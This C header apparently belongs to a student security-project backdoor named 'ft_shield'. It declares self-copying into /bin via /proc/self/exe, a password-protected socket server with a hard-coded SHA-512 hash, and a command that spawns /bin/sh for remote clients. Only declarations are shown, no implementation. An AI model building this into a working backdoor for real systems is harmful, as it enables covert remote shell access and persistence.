#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# include <fcntl.h>
# include <libgen.h>
# include <netinet/in.h>
# include <signal.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/select.h>
# include <sys/socket.h>
# include <unistd.h>

# define STUDENT_LOGIN "lmartin"
# define PRG_NAME "ft_shield"
# define TARGET_LOCATION "/bin"
# define PROC_SELF_EXE "/proc/self/exe"

# define BIN_SHELL "/bin/sh"
# define READ_END 0
# define WRITE_END 1

# define BUFFER_SIZE 4096
# define MAX_PATH_SIZE 256

# define MAX_CLIENTS 3

typedef struct			s_client
{
	int					fd;
	bool				logged;
	int					fd_shell;
	pid_t				shell_pid;
	pid_t				supervisor_pid;
	bool				shell;
}						t_client;

typedef struct			s_serv
{
	int					port;
	struct sockaddr_in	addr;
	int					sockfd;
	fd_set				fd_read;
	fd_set				fd_master;
	t_client			clients[MAX_CLIENTS];
	int					nb_clients;
}						t_serv;

# define HASHED_PWD "319d8f2b0e67a1abe8d63330976c0a3b743f57e24d002137aacf2f55a5b3fa2adead8e27e878df1da8c9cbef1d754ed8754cdc4bf616f01b44c80826e57625f8"

# define NB_CMDS 3
# define CMD				{"help", "shell", "exit"}
# define CMD_FUNC			{&show_help, &spawn_shell, &logout}

# define send_str(x,y) send(x, y, strlen(y), 0)

/* sha512.c */
char		*sha512(char *str, size_t size);

#endif
